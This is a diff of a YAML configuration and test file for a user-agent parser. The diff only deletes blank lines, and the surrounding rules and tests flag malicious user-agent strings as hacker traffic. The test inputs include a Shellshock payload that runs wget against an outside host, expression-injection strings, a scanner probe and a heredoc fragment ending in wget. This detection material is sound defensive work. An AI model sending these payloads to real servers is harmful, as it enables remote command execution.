@@ -138,7 +138,6 @@ config:
       HackerToolkit                        : 'Unknown'
       __SyntaxError__                      : 'true'
 
-
 - test:
     input:
       user_agent_string: '('''') { :;}; wget http://whsec.us/20147169/10000646/ff16d94243 #, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1 WhiteHat Security'
@@ -167,7 +166,6 @@ config:
       HackerAttackVector                   : 'Shell Shock'
       HackerToolkit                        : 'Unknown'
       __SyntaxError__                      : 'true'
-
 
 - matcher:
     require:
@@ -213,7 +211,6 @@ config:
       AgentNameVersionMajor                : 'Hacker'
       HackerAttackVector                   : 'Javascript'
       HackerToolkit                        : 'Unknown'
-
 
 - matcher:
     require:
@@ -289,7 +286,6 @@ config:
     - 'AgentVersion          :   10000:"Hacker"'
     - 'HackerAttackVector    :   10000:"Serverside execute"'
     - 'HackerToolkit         :       1:"Unknown"'
-
 
 - test:
     input:
@@ -369,7 +365,6 @@ config:
       HackerAttackVector                   : 'Serverside include'
       HackerToolkit                        : 'Nessus'
 
-
 - matcher:
     require:
     - 'agent~"JDatabaseDriverMysqli"'
@@ -388,7 +383,6 @@ config:
     - 'AgentVersion          :   10000:"Hacker"'
     - 'HackerAttackVector    :   10000:"Remote exec Joomla"'
     - 'HackerToolkit         :       1:"Unknown"'
-
 
 # If there are NO products found this is either manipulated or a Hacker.
 - matcher:
@@ -446,7 +440,6 @@ config:
       HackerToolkit                        : 'Unknown'
       __SyntaxError__                      : 'true'
 
-
 # Completely empty --> must be hacker.
 - test:
     input:
@@ -475,7 +468,6 @@ config:
       HackerAttackVector                   : 'Unknown'
       HackerToolkit                        : 'Unknown'
 
-
 - matcher:
     require:
     - 'agent{"("'
@@ -500,7 +492,6 @@ config:
     - 'HackerToolkit                      : 10:"Unknown"'
     - 'AgentNameVersion                   : 10:"Hacker"'
     - 'AgentNameVersionMajor              : 10:"Hacker"'
-
 
 - test:
     input:
@@ -529,8 +520,6 @@ config:
       HackerAttackVector                   : 'Remote exec Joomla'
       HackerToolkit                        : 'Unknown'
       __SyntaxError__                      : 'true'
-
-
 
 # If there is ONLY a product name and nothing else then this is either manipulated or a Hacker.
 - matcher:
@@ -588,7 +577,6 @@ config:
       HackerAttackVector                   : 'Unknown'
       HackerToolkit                        : 'Unknown'
 
-
 - test:
     input:
       user_agent_string: '${9999072+10000055}'
@@ -617,8 +605,6 @@ config:
       HackerToolkit                        : 'Unknown'
       __SyntaxError__                      : 'true'
 
-
-
 - test:
     input:
       user_agent_string: '${@print(md5(acunetix_wvs_security_test))}\'
@@ -646,8 +632,6 @@ config:
       HackerAttackVector                   : 'Unknown'
       HackerToolkit                        : 'Unknown'
       __SyntaxError__                      : 'true'
-
-
 
 # For reference:
 #true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || wget
@@ -777,7 +761,6 @@ config:
       AgentNameVersionMajor                : 'Hacker'
       HackerAttackVector                   : 'Spy scraper'
       HackerToolkit                        : 'Googlebot immitator'
-
 
 - matcher:
 #    options:
